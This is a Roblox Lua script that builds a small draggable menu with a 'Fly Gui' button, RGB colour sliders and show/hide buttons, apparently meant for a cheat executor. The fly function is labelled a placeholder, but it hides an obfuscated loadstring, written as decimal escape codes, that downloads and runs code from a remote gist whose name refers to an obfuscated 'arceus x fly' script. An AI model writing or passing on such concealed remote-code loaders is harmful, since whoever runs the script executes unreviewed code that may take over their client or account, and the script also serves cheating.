local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

-- Detect if the user is on a mobile device
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- Create the main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MainGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = isMobile and UDim2.new(0.8, 0, 0.4, 0) or UDim2.new(0, 200, 0, 130)
MainFrame.Position = UDim2.new(0.5, -MainFrame.Size.X.Offset / 2, 0.1, 0)
MainFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
MainFrame.BorderSizePixel = 2
MainFrame.Parent = ScreenGui

-- Create the title bar
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, isMobile and 40 or 30)
TitleBar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
TitleBar.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(1, -90, 1, 0)
TitleLabel.Position = UDim2.new(0, 5, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Main Menu"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.FontSize = Enum.FontSize.Size18
TitleLabel.Parent = TitleBar

-- Create close and open buttons
local function createTitleBarButton(name, position, color)
    local button = Instance.new("TextButton")
    button.Name = name .. "Button"
    button.Size = UDim2.new(0, isMobile and 40 or 30, 0, isMobile and 40 or 30)
    button.Position = position
    button.BackgroundColor3 = color
    button.Text = ""
    button.Parent = TitleBar
    return button
end

local CloseButton = createTitleBarButton("Close", UDim2.new(1, -80, 0, 0), Color3.new(0.8, 0, 0))
local OpenButton = createTitleBarButton("Open", UDim2.new(1, -40, 0, 0), Color3.new(0, 0.8, 0))

-- Create the fly button
local FlyButton = Instance.new("TextButton")
FlyButton.Name = "FlyButton"
FlyButton.Size = UDim2.new(0.8, 0, 0, isMobile and 50 or 30)
FlyButton.Position = UDim2.new(0.1, 0, 0, isMobile and 60 or 40)
FlyButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.8)
FlyButton.Text = " Fly Gui"
FlyButton.TextColor3 = Color3.new(1, 1, 1)
FlyButton.FontSize = Enum.FontSize.Size18
FlyButton.Parent = MainFrame

-- Create the settings GUI button
local SettingsButton = Instance.new("TextButton")
SettingsButton.Name = "SettingsButton"
SettingsButton.Size = UDim2.new(0.8, 0, 0, isMobile and 50 or 30)
SettingsButton.Position = UDim2.new(0.1, 0, 0, isMobile and 120 or 80)
SettingsButton.BackgroundColor3 = Color3.new(0.8, 0.4, 0.4)
SettingsButton.Text = "Toggle Settings"
SettingsButton.TextColor3 = Color3.new(1, 1, 1)
SettingsButton.FontSize = Enum.FontSize.Size18
SettingsButton.Parent = MainFrame

-- Flying functionality (placeholder)
local flying = false
local function toggleFly()
    flying = not flying
  loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end

FlyButton.MouseButton1Click:Connect(toggleFly)

-- Function to make a GUI element draggable
local function makeDraggable(gui)
    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    TitleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    TitleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Settings GUI creation functionality
local SettingsGui = nil

local function createSettingsGui()
    if SettingsGui then return end

    SettingsGui = Instance.new("Frame")
    SettingsGui.Name = "SettingsGui"
    SettingsGui.Size = UDim2.new(0.8, 0, 0.6, 0)
    SettingsGui.Position = UDim2.new(0.1, 0, 0.2, 0)
    SettingsGui.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    SettingsGui.Visible = false
    SettingsGui.Parent = MainFrame
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "TitleLabel"
    TitleLabel.Size = UDim2.new(1, 0, 0.1, 0)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "Color Settings"
    TitleLabel.TextColor3 = Color3.new(1, 1, 1)
    TitleLabel.FontSize = Enum.FontSize.Size24
    TitleLabel.Parent = SettingsGui

    -- Create color sliders
    local function createColorSlider(name, position, initialColor, updateColorCallback)
        local sliderFrame = Instance.new("Frame")
        sliderFrame.Size = UDim2.new(0.8, 0, 0.1, 0)
        sliderFrame.Position = position
        sliderFrame.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
        sliderFrame.Parent = SettingsGui

        local slider = Instance.new("TextButton")
        slider.Size = UDim2.new(0.1, 0, 1, 0)
        slider.BackgroundColor3 = Color3.new(1, 1, 1)
        slider.Text = ""
        slider.Parent = sliderFrame

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0.2, 0, 1, 0)
        label.Position = UDim2.new(-0.25, 0, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = name
        label.TextColor3 = Color3.new(1, 1, 1)
        label.FontSize = Enum.FontSize.Size14
        label.Parent = sliderFrame

        local valueLabel = Instance.new("TextLabel")
        valueLabel.Size = UDim2.new(0.2, 0, 1, 0)
        valueLabel.Position = UDim2.new(1.05, 0, 0, 0)
        valueLabel.BackgroundTransparency = 1
        valueLabel.Text = tostring(math.floor(initialColor * 255))
        valueLabel.TextColor3 = Color3.new(1, 1, 1)
        valueLabel.FontSize = Enum.FontSize.Size14
        valueLabel.Parent = sliderFrame

        local function updateSlider(input)
            local sliderPosition = math.clamp((input.Position.X - sliderFrame.AbsolutePosition.X) / sliderFrame.AbsoluteSize.X, 0, 1)
            slider.Position = UDim2.new(sliderPosition, 0, 0, 0)
            local value = math.floor(sliderPosition * 255)
            valueLabel.Text = tostring(value)
            updateColorCallback(value / 255)
        end

        slider.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                local connection
                connection = UserInputService.InputChanged:Connect(function(newInput)
                    if newInput.UserInputType == Enum.UserInputType.MouseMovement or newInput.UserInputType == Enum.UserInputType.Touch then
                        updateSlider(newInput)
                    end
                end)
                UserInputService.InputEnded:Connect(function(newInput)
                    if newInput.UserInputType == Enum.UserInputType.MouseButton1 or newInput.UserInputType == Enum.UserInputType.Touch then
                        connection:Disconnect()
                    end
                end)
            end
        end)

        return slider
    end

    -- Create RGB sliders
    local redSlider = createColorSlider("Red", UDim2.new(0.1, 0, 0.2, 0), MainFrame.BackgroundColor3.R, function(value)
        MainFrame.BackgroundColor3 = Color3.new(value, MainFrame.BackgroundColor3.G, MainFrame.BackgroundColor3.B)
    end)

    local greenSlider = createColorSlider("Green", UDim2.new(0.1, 0, 0.4, 0), MainFrame.BackgroundColor3.G, function(value)
        MainFrame.BackgroundColor3 = Color3.new(MainFrame.BackgroundColor3.R, value, MainFrame.BackgroundColor3.B)
    end)

    local blueSlider = createColorSlider("Blue", UDim2.new(0.1, 0, 0.6, 0), MainFrame.BackgroundColor3.B, function(value)
        MainFrame.BackgroundColor3 = Color3.new(MainFrame.BackgroundColor3.R, MainFrame.BackgroundColor3.G, value)
    end)

    -- Close button for settings
    local CloseSettingsButton = Instance.new("TextButton")
    CloseSettingsButton.Name = "CloseSettingsButton"
    CloseSettingsButton.Size = UDim2.new(0, 30, 0, 30)
    CloseSettingsButton.Position = UDim2.new(1, -30, 0, 0)
    CloseSettingsButton.BackgroundColor3 = Color3.new(0.8, 0, 0)
    CloseSettingsButton.Text = "X"
    CloseSettingsButton.TextColor3 = Color3.new(1, 1, 1)
    CloseSettingsButton.FontSize = Enum.FontSize.Size18
    CloseSettingsButton.Parent = SettingsGui
    
    CloseSettingsButton.MouseButton1Click:Connect(function()
        SettingsGui.Visible = false
    end)
end

local function toggleSettingsGui()
    if not SettingsGui then
        createSettingsGui()
    end
    SettingsGui.Visible = not SettingsGui.Visible
end

SettingsButton.MouseButton1Click:Connect(toggleSettingsGui)

-- Function to toggle the main GUI visibility
local function toggleMainGui()
    MainFrame.Visible = not MainFrame.Visible
end

CloseButton.MouseButton1Click:Connect(toggleMainGui)
OpenButton.MouseButton1Click:Connect(toggleMainGui)

-- Make the main frame draggable
makeDraggable(MainFrame)

-- Add hover effects to buttons
local function addHoverEffect(button)
    local originalColor = button.BackgroundColor3
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = originalColor:Lerp(Color3.new(1, 1, 1), 0.2)
    end)
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = originalColor
    end)
end

addHoverEffect(FlyButton)
addHoverEffect(SettingsButton)
addHoverEffect(CloseButton)
addHoverEffect(OpenButton)

-- Initialize the GUI to be visible
MainFrame.Visible = true